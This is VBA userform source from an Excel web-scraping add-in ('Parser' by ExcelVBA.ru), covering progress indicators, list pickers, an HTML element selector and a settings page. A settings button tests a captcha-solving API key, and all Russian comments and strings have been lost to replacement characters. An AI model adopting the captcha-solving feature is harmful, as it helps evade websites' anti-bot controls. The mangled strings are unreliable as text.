    Set ctrl = Me.Controls(Me.ComboBox_VariableList.Tag)
    If Me.ComboBox_VariableList.value = "help" Then
        FWF.FollowHyperlink "http://excelvba.ru/programmes/Parser/manuals/SpecialVariables"
    Else
        txt$ = Left(ctrl.text, ctrl.SelStart) & Me.ComboBox_VariableList.value & Mid(ctrl.text, ctrl.SelStart + ctrl.SelLength + 1)
        ctrl.text = txt$
    End If
End Sub

Attribute VB_Name = "F_Progress"
Attribute VB_Base = "0{C7D85029-CF8F-4467-9E4D-24B3988D7F9E}{7C3D4F19-78C5-41E8-ADB7-698221EFD11B}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Progress                    Version: 2 |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
' Author        : Igor Vakhnenko                   Date: 21.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public Indicator As ProgressIndicator, ButtonMacro$
Dim MSG_StopMacro$, MSG_StopMacroTitle$

Private Sub UserForm_Initialize()
    On Error Resume Next
    MSG_StopMacro$ = Run(TWN & "tt", "PI_MSG_StopMacro")
    If MSG_StopMacro$ = "" Then MSG_StopMacro$ = "Do you really want to stop the macro?"
    MSG_StopMacroTitle$ = Run(TWN & "tt", "PI_MSG_StopMacroTitle")
    If MSG_StopMacroTitle$ = "" Then MSG_StopMacroTitle$ = "Processing is not complete yet"
    Err.Clear
End Sub

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next
    If Len(ButtonMacro$) Then Run TWN & ButtonMacro$
End Sub

Private Sub CommandButton_Stop_Click()
    On Error Resume Next
    If StopMacro Then        ' macro finished
        If IsObject(F_Greeting) Then
            If F_Greeting.Visible Then
                Unload Me
                Exit Sub
            End If
        Else
            End
        End If
    Else        ' macro is running
        If MsgBox(MSG_StopMacro$, vbQuestion + vbDefaultButton2 + vbYesNo, MSG_StopMacroTitle$) = vbYes Then
            StopMacro = True
            With RunningParser.PrInd1
                .line1 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
                .line2 = "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
                .line3 = ""
            End With
        End If
    End If
End Sub

Private Sub SpinButton_log_Change()
    On Error Resume Next
    n = Me.SpinButton_log.value
    Me.Height = IIf(n = 0, 82, 92 + n * 40)
    Me.TextBox_Log.Height = 40 * n
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Not Indicator Is Nothing Then Indicator.QueryClose
End Sub
Attribute VB_Name = "F_ProgressNew"
Attribute VB_Base = "0{033B84D9-5D05-43C7-9345-DA318BF7F635}{40948F7F-5DD2-4150-9A25-F00C4ABCD956}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_ProgressNew                    Version: 3.0
' Author        : Igor Vakhnenko                   Date: 03.11.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit

Public ShowStatus As Boolean, ShowLog As Boolean, ShowMessages As Boolean, ShowExtraBar As Boolean
Public Indicator As ProgressIndicatorNew, ButtonMacro$
Dim MSG_StopMacro$, MSG_StopMacroTitle$, objects As Dictionary, LinesCount&

Public Enum pi_Object_Type
    pi_TextLine = 0
    pi_Bar = 1
    pi_BackBar = 2
End Enum

'Const FIRST_LINE_SUMMARY_HEIGHT& = 30, USUAL_LINE_SUMMARY_HEIGHT& = 24
Const LINE_WIDTH& = 400, LINE_PADDING_LEFT& = 14, TEXTLINE_HEIGHT& = 14, LINE_MARGIN_BOTTOM& = 6
Const PI_FORM_PADDING_TOP& = 9, PI_FORM_PADDING_BOTTOM& = 10, PI_FORM_MIN_HEIGHT& = 40

Sub SetBar(ByVal Index&, ByVal Percent!)
    On Error Resume Next
    With objects.item("Bar" & Index)
        .Width = LINE_WIDTH& * Percent!
        .Visible = True
    End With
    With objects.item("BackBar" & Index)
        .Visible = True
    End With
End Sub

Sub SetText(ByVal Index&, ByVal NewText$)
    On Error Resume Next
    With objects.item("TextLine" & Index)
        .Caption = NewText$
        .Visible = True
    End With
End Sub

Function GetControl(ByVal Index&, ByVal ObjType As pi_Object_Type) As MSForms.Control
    On Error Resume Next: Dim objName$
    Select Case ObjType
        Case pi_TextLine: objName$ = "TextLine"
        Case pi_Bar: objName$ = "Bar"
        Case pi_BackBar: objName$ = "BackBar"
    End Select
    Set GetControl = objects.item(objName$ & Index&)
End Function

Sub AddLine(ByVal Index&, Optional ByVal HideBar As Boolean = False)
    'Debug.Print "AddLine", index&, HideBar
    On Error Resume Next
    Dim BackBar As MSForms.Label, Bar As MSForms.Label, TextLine As MSForms.Label, BackBarName$, BarName$, TextLineName$
    Dim NeedForResize As Boolean, LineTop&
    'LineTop& = PI_FORM_PADDING_TOP& + IIf(index = 1, 0, FIRST_LINE_SUMMARY_HEIGHT&) + USUAL_LINE_SUMMARY_HEIGHT& * (index& - IIf(index = 1, 1, 2))
    LineTop& = ControlsHeight + IIf(Index = 1, 0, LINE_MARGIN_BOTTOM&)

    TextLineName$ = "TextLine" & Index
    If Not objects.Exists(TextLineName$) Then
        Set TextLine = Me.Controls.Add("Forms.Label.1", TextLineName$, True)
        With TextLine
            .Width = LINE_WIDTH&: .Height = TEXTLINE_HEIGHT&
            .Left = LINE_PADDING_LEFT&: .Top = LineTop&: .Font.Name = "Arial"
            '.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & index& & ""
            .Font.Size = 8: If Index = 1 Then .Font.Bold = True
        End With
        NeedForResize = True: objects.Add TextLineName$, TextLine
    End If

    BackBarName$ = "BackBar" & Index
    If Not objects.Exists(BackBarName$) Then
        Set BackBar = Me.Controls.Add("Forms.Label.1", BackBarName$, True)
        With BackBar
            .Width = LINE_WIDTH& + 4: .Height = IIf(Index = 1, 8, 4) + 4: .SpecialEffect = fmSpecialEffectSunken
            .Left = LINE_PADDING_LEFT& - 2: .Top = LineTop& + TEXTLINE_HEIGHT& - IIf(Index = 1, 0, 2) - 2
            .Visible = Not HideBar
        End With
        NeedForResize = True: objects.Add BackBarName$, BackBar
    End If

    BarName$ = "Bar" & Index
    If Not objects.Exists(BarName$) Then
        Set Bar = Me.Controls.Add("Forms.Label.1", BarName$, True)
        With Bar
            .Width = LINE_WIDTH& * Rnd() * 0: .Height = IIf(Index = 1, 8, 4): .BackColor = vbGreen:    '.SpecialEffect = fmSpecialEffectEtched
            .Left = LINE_PADDING_LEFT&: .Top = LineTop& + TEXTLINE_HEIGHT& - IIf(Index = 1, 0, 2)
            .Visible = Not HideBar
        End With
        NeedForResize = True: objects.Add BarName$, Bar
    End If

    If NeedForResize Then ResizeForm
End Sub

Sub HideLine(ByVal Index&, Optional ByVal Delete As Boolean = False)
    On Error Resume Next
    Dim Bar As MSForms.Label, BackBar As MSForms.Label, TextLine As MSForms.Label, BarName$, BackBarName$, TextLineName$, NextTextLineName$

    TextLineName$ = "TextLine" & Index
    NextTextLineName$ = "TextLine" & Index + 1
    If objects.Exists(NextTextLineName$) Then HideLine Index + 1, Delete

    If objects.Exists(TextLineName$) Then
        Set TextLine = objects.item(TextLineName$)
        TextLine.Visible = False

        BarName$ = "Bar" & Index
        Set Bar = objects.item(BarName$)
        Bar.Visible = False

        BackBarName$ = "BackBar" & Index
        Set BackBar = objects.item(BackBarName$)
        BackBar.Visible = False

        If Delete Then
            Set TextLine = Nothing: objects.Remove TextLineName$
            Set Bar = Nothing: objects.Remove BarName$
            Set BackBar = Nothing: objects.Remove BackBarName$
        End If
    End If

    If Delete Then ResizeForm
End Sub

Sub ResizeForm()
    On Error Resume Next
    Dim MaxVCoord&, NewHeight&

    If Not Me.Indicator.Temporary Then
        MaxVCoord& = ControlsHeight + PI_FORM_PADDING_BOTTOM&
        If MaxVCoord& < PI_FORM_MIN_HEIGHT& Then MaxVCoord& = PI_FORM_MIN_HEIGHT&
    End If

    If Me.ShowMessages Then
        Me.Frame_Messages.Top = MaxVCoord&
        MaxVCoord& = MaxVCoord& + Me.Frame_Messages.Height - 3
    End If
    Me.Frame_Messages.Visible = Me.ShowMessages

    If Me.ShowStatus Then
        Me.Frame_Status.Top = MaxVCoord&
        MaxVCoord& = MaxVCoord& + Me.Frame_Status.Height - 3
    End If
    Me.Frame_Status.Visible = Me.ShowStatus

    If Me.ShowExtraBar Then
        Me.Frame_Extra.Top = MaxVCoord&
        MaxVCoord& = MaxVCoord& + Me.Frame_Extra.Height - 3
    End If
    Me.Frame_Extra.Visible = Me.ShowExtraBar

    If Me.ShowLog Then
        Me.Frame_Log.Top = MaxVCoord&
        MaxVCoord& = MaxVCoord& + Me.Frame_Log.Height - 3
    End If
    Me.Frame_Log.Visible = Me.ShowLog

    NewHeight& = MaxVCoord& + Me.Height - Me.InsideHeight
    If Abs(Me.Height - NewHeight&) > 1 Then Me.Height = NewHeight&: DoEvents:    ' Debug.Print "NewHeight = " & NewHeight&
    'Me.Height = 200
    'Me.Repaint
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Set objects = New Dictionary
    MSG_StopMacro$ = Run(TWN & "tt", "PI_MSG_StopMacro")
    If MSG_StopMacro$ = "" Then MSG_StopMacro$ = "Do you really want to stop the macro?"
    MSG_StopMacroTitle$ = Run(TWN & "tt", "PI_MSG_StopMacroTitle")
    If MSG_StopMacroTitle$ = "" Then MSG_StopMacroTitle$ = "Processing is not complete yet"
    Err.Clear
    Me.ResizeForm
End Sub

Private Sub CommandButton_RunMacro_Click()
    On Error Resume Next: If Len(ButtonMacro$) Then Run TWN & ButtonMacro$
End Sub

Private Sub CommandButton_Stop_Click()
    StopProcess
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If Me.Indicator.TestMode Then Exit Sub

    Cancel = CloseMode = 0: If Cancel Then Exit Sub
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Controls
        Me.Controls.Remove ctrl.Name
    Next
    If Not Me.Indicator Is Nothing Then Me.Indicator.QueryClose

    Set Me.Indicator = Nothing
    Set objects = Nothing
End Sub
Private Sub UserForm_Terminate()
    On Error Resume Next
    Set Me.Indicator = Nothing
    Set objects = Nothing
    Set CurrentPIuserform = Nothing
End Sub

Function StopProcess() As Boolean
    On Error Resume Next
    If StopMacro Then        ' macro finished
        'End
        StopProcess = True
        Me.CommandButton_stop.Enabled = False
    Else        ' macro is running
        If MsgBox(MSG_StopMacro$, vbQuestion + vbDefaultButton2 + vbYesNo, MSG_StopMacroTitle$) = vbYes Then
            StopMacro = True
            StopProcess = True
            Run TWN & "ProgressIndicator_OnStop"
        End If
    End If
End Function

Function ControlsHeight() As Long    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim ctrl, CtrlVCoord&, MaxVCoord&
    For Each ctrl In objects.Items
        'If ctrl.Visible Then
        CtrlVCoord& = ctrl.Top + ctrl.Height
        If CtrlVCoord& > MaxVCoord& Then MaxVCoord& = CtrlVCoord&
        'End If
    Next
    If MaxVCoord& < PI_FORM_PADDING_TOP& Then MaxVCoord& = MaxVCoord& + PI_FORM_PADDING_TOP&
    ControlsHeight = MaxVCoord&
End Function

Sub StartSlider()
    On Error Resume Next
    Run_ExtraProgressBar_Slider
End Sub
Attribute VB_Name = "F_Publish"
Attribute VB_Base = "0{106A438E-DBA3-4350-AF79-A8FFBB6D5471}{6BC2347A-01A8-47F0-A5A5-924C07EBFC68}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Publish                    Version:
' Author        : Igor Vakhnenko                   Date: 25.06.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Public WP As WebsiteParser

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next
    Unload Me
End Sub

Private Sub CommandButton4_Click()
    On Error Resume Next
    If Not Run(CFA_NAME$ & "Ready") Then MsgBox "CommonFunctions add-in is not available now", vbExclamation: Exit Sub
    Run CFA_NAME$ & "PublishParserObject", PROJECT_NAME$, ThisWorkbook

End Sub

Private Sub UserForm_Activate()
    On Error Resume Next
    Me.TextBox_Filename_Source = WP.Name
    Me.TextBox_Filename_Web = WP.Name
    Me.TextBox_Title = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & WP.Name
End Sub

Attribute VB_Name = "F_Publish_old"
Attribute VB_Base = "0{97672A7E-DEE9-4B0D-8433-C21FE5A5173C}{0433A6E0-67A0-4B66-8FD3-381F99AD4A28}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub CommandButton_GetFromClipboard_HTMLdescr_Click()
    On Error Resume Next: Dim FileName$: FileName$ = GetPathFromClipboard
    If Len(FileName$) Then Me.TextBox_Filename_HTMLdescr = FileName$
End Sub

Private Sub CommandButton_GetFromClipboard_screenshot_Click()
    On Error Resume Next: Dim FileName$: FileName$ = GetPathFromClipboard
    If Len(FileName$) Then Me.TextBox_Filename_screenshot = FileName$
End Sub

Function GetPathFromClipboard()
    On Error Resume Next
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        GetPathFromClipboard = .GetText
    End With
    If Dir(GetPathFromClipboard, vbNormal) = "" Then GetPathFromClipboard = ""
End Function

Attribute VB_Name = "F_SelectElement"
Attribute VB_Base = "0{76984455-EC18-4096-AB33-753052B1DE1B}{02A73CF5-FCBC-47BA-85B3-B68FBAC30721}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_SelectElement                    Version: 1
' Author        : Igor Vakhnenko                   Date: 02.03.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

'Option Explicit
Option Compare Text

Private WithEvents mHTMLDocument As MSHTML.HTMLDocument
Attribute mHTMLDocument.VB_VarHelpID = -1
Public ActiveElement As MSHTML.IHTMLElement

Private Sub ListBox_Elements_Change()
    On Error Resume Next
    Dim EL As MSHTML.IHTMLElement
    Set EL = GetHTMLTreeObject(Val(Me.ListBox_Elements.list(Me.ListBox_Elements.ListIndex, 3)))

    Me.TextBox_ElementText.text = "error"
    If Not EL Is Nothing Then
        Me.TextBox_ElementText.text = ConvertHTMLtoText(EL.outerHTML)
    End If
End Sub

Private Function mHTMLDocument_oncontextmenu() As Boolean
    'On Error Resume Next
    Set Me.ActiveElement = mHTMLDocument.parentWindow.event.srcElement
    UpdateActiveElementInfo
End Function

Private Sub mHTMLDocument_onmousemove()
    On Error Resume Next
    Set Me.ActiveElement = mHTMLDocument.parentWindow.event.srcElement
    Me.Caption = Me.ActiveElement.TagName
End Sub

Sub UpdateActiveElementInfo()
    On Error Resume Next
    Dim i&
    If GetActiveElementInfo(Me.ActiveElement) Then
        Me.ListBox_Elements.Enabled = True
        Me.ListBox_Elements.list = ElementsTreeArray

        For i = 0 To Me.ListBox_Elements.ListCount - 1
            Me.ListBox_Elements.Selected(i) = Val(Me.ListBox_Elements.list(i, 0)) = 0
        Next i
    Else
        Me.ListBox_Elements.Enabled = False
        Me.ListBox_Elements.Clear
    End If
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Me.WebBrowser1.Silent = True
    Me.WebBrowser1.Navigate "http://excelvba.ru/programmes/Parser"

    While WebBrowser1.document Is Nothing
        DoEvents
    Wend
    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| html |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set mHTMLDocument = WebBrowser1.document
End Sub

Private Sub WebBrowser1_BeforeNavigate2(ByVal pDisp As Object, URL As Variant, flags As Variant, TargetFrameName As Variant, _
                                        PostData As Variant, headers As Variant, Cancel As Boolean)
    On Error Resume Next
    'If MsgBox(URL, vbOKCancel) = vbOK Then Exit Sub
End Sub


'Private Function mHTMLDocument_onclick() As Boolean
'    '|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 'cmd1'
'    If mHTMLDocument.parentWindow.Event.srcElement.ID = "cmd1" Then
'        MsgBox mHTMLDocument.getElementById("txt1").Value
'    End If
'End Function
Attribute VB_Name = "F_SelectFromList"
Attribute VB_Base = "0{8C361FCE-1855-488C-9B35-BBC8FBF1A286}{3ECBD449-1321-4F19-9589-3A67461B60B6}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_SelectFromList                    Version:
' Author        : Igor Vakhnenko                   Date: 02.11.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next
    Unload Me
End Sub

Private Sub CommandButton_OK_Click()
    On Error Resume Next: Dim i&
    With Me.ListBox_Items
        ReDim arr(0 To .ListCount - 1)
        For i = LBound(arr) To UBound(arr)
            Select Case True
                Case Me.OptionButton_MultiSelect: arr(i) = .Selected(i)
                Case Me.OptionButton_SetFirst: arr(i) = .ListIndex <= i
                Case Me.OptionButton_ChooseOne: arr(i) = .ListIndex = i
            End Select
        Next i
    End With

    SelectFromArrayResult = arr
    Unload Me
End Sub

Private Sub CommandButton_SelectAll_Click()
    On Error Resume Next: Dim i&
    For i = 0 To Me.ListBox_Items.ListCount - 1
        Me.ListBox_Items.Selected(i) = True
    Next
End Sub

Private Sub CommandButton_UnselectAll_Click()
    On Error Resume Next: Dim i&
    For i = 0 To Me.ListBox_Items.ListCount - 1
        Me.ListBox_Items.Selected(i) = False
    Next
End Sub

Sub ListBox_Items_Change()
    On Error Resume Next
    Dim i&, cnt&
    For i = 0 To Me.ListBox_Items.ListCount - 1
        cnt& = cnt - Me.ListBox_Items.Selected(i)
    Next
    'Me.CommandButton_Cancel.Caption = cnt& & ", " & Me.ListBox_Items.ListIndex
    Me.CommandButton_OK.Enabled = cnt& > 0
    If Me.OptionButton_MultiSelect Then
        Me.CommandButton_SelectAll.Enabled = cnt < Me.ListBox_Items.ListCount
        Me.CommandButton_UnselectAll.Enabled = cnt > 0
    End If
End Sub

Private Sub OptionButton_ChooseOne_Click()
    On Error Resume Next
    Me.ListBox_Items.ListStyle = fmListStyleOption
    Me.ListBox_Items.MultiSelect = fmMultiSelectSingle
    li& = Me.ListBox_Items.ListIndex: Me.ListBox_Items.ListIndex = -1: Me.ListBox_Items.ListIndex = li
    ListBox_Items_Change
    Me.CommandButton_SelectAll.Enabled = False
    Me.CommandButton_UnselectAll.Enabled = False
End Sub

Private Sub OptionButton_MultiSelect_Click()
    On Error Resume Next
    Me.ListBox_Items.ListStyle = fmListStyleOption
    Me.ListBox_Items.MultiSelect = fmMultiSelectExtended
    li& = Me.ListBox_Items.ListIndex: Me.ListBox_Items.ListIndex = -1: Me.ListBox_Items.ListIndex = li
    ListBox_Items_Change
    Me.CommandButton_SelectAll.Enabled = True
    Me.CommandButton_UnselectAll.Enabled = True
End Sub

Private Sub OptionButton_SetFirst_Click()
    On Error Resume Next
    Me.ListBox_Items.ListStyle = fmListStylePlain
    Me.ListBox_Items.MultiSelect = fmMultiSelectSingle
    li& = Me.ListBox_Items.ListIndex: Me.ListBox_Items.ListIndex = -1: Me.ListBox_Items.ListIndex = li
    ListBox_Items_Change
    Me.CommandButton_SelectAll.Enabled = False
    Me.CommandButton_UnselectAll.Enabled = False
End Sub

Sub SetMode(ByVal Mode As SELECT_OPTIONS)
    On Error Resume Next
    Select Case Mode
        Case so_MultiSelect
            Me.OptionButton_MultiSelect.value = 1
        Case so_SetFirst
            Me.OptionButton_SetFirst.value = 1
        Case so_OnlyOne
            Me.OptionButton_ChooseOne.value = 1
    End Select
End Sub

Sub SetAvailableModes(ByVal Mode As SELECT_OPTIONS)
    On Error Resume Next
    Select Case Mode
        Case so_None
            Me.OptionButton_MultiSelect.Enabled = Me.OptionButton_MultiSelect.value
            Me.OptionButton_SetFirst.Enabled = Me.OptionButton_SetFirst.value
            Me.OptionButton_ChooseOne.Enabled = Me.OptionButton_ChooseOne.value
        Case so_All
            Me.OptionButton_MultiSelect.Enabled = 1
            Me.OptionButton_SetFirst.Enabled = 1
            Me.OptionButton_ChooseOne.Enabled = 1
    End Select
End Sub

Sub SelectOnStart(ByVal DefaultSelection$)
    On Error Resume Next: Dim i&, v
    With Me.ListBox_Items

        Select Case Val(DefaultSelection$)
            Case -1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Select Case True
                    Case Me.OptionButton_MultiSelect
                        For i = 0 To .ListCount - 1: .Selected(i) = True: Next i
                    Case Me.OptionButton_SetFirst: .ListIndex = 0
                    Case Me.OptionButton_ChooseOne: .ListIndex = 0
                End Select

            Case 0    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                .ListIndex = 0
                
            Case Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1|5|8
                If Me.OptionButton_MultiSelect Then
                    For Each v In Split(DefaultSelection$, "|")
                        v = Val(Trim(v)): If v > 0 Then .Selected(v - 1) = True
                    Next
                End If
        End Select
    End With
End Sub

Private Sub UserForm_Click()
    On Error Resume Next
    
End Sub
Attribute VB_Name = "F_Settings"
Attribute VB_Base = "0{ECBD964B-D9CA-4695-AD27-10FAC18740AA}{2BC42981-FD22-4E32-802E-D42F7D1ABFC3}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Settings                    Version:
' Author        : Igor Vakhnenko                   Date: 27.04.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

'---------------------------------------------------------------------------------------
' Module        : F_Settings                    Version:
' Author        : Igor Vakhnenko                   Date: 27.10.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Dim SpecialControlsCollection As Collection

Private Sub CommandButton_Login_Click()
    On Error Resume Next: Dim msg$, pwd$
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
        "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    pwd$ = Trim(InputBox(msg, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"))
    If pwd$ = "" Then Exit Sub
    
    If Not Request_("action=staffer_access", "data=" & pwd$) Then
        MsgBox tt("FA_ACT_ConnectError"), vbCritical, PROJECT_NAME$
        Exit Sub
    End If
End Sub

Private Sub CommandButton_Quit_Click()
    Unload Me
End Sub

Private Sub CommandButton_ResetAllSettings_Click()
    On Error Resume Next
    If MsgBox(tt("ResetAllSettings_MessageText"), vbQuestion + vbOKCancel + vbDefaultButton2, tt("ResetAllSettings_MessageTitle")) = vbCancel Then Exit Sub
    DeleteSetting PROJECT_NAME$, "Settings"
    SaveDefaultSettings
    
    Delay$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * 0.3, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & Delay$ & ", ""'" & ThisWorkbook.Name & "'!ShowSettingsPage"")"
    Unload Me
End Sub

Private Sub CommandButton_SelectCacheFolder_Click()
    On Error Resume Next
    NewFolder$ = FWF.GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", CACHE_FOLDER$)
    If NewFolder$ = "" Then Exit Sub
    Me.TextBox_CacheFolder = NewFolder$
End Sub

Private Sub CommandButton_SelectPluginFolder_Click()
    On Error Resume Next
    NewFolder$ = FWF.GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", PARSERS_FOLDER$)
    If NewFolder$ = "" Then Exit Sub
    Me.TextBox_PluginFolder = Replace(NewFolder$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
End Sub

Private Sub CommandButton_test_solve_captcha_Click()
    On Error Resume Next: Dim APIkey$
    APIkey$ = Trim(SETT.GetText("TextBox_CaptchaAPIkey"))    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    SETT.SetText "TextBox_CaptchaAPIkey", Me.TextBox_CaptchaAPIkey    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    test_solve_captcha    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
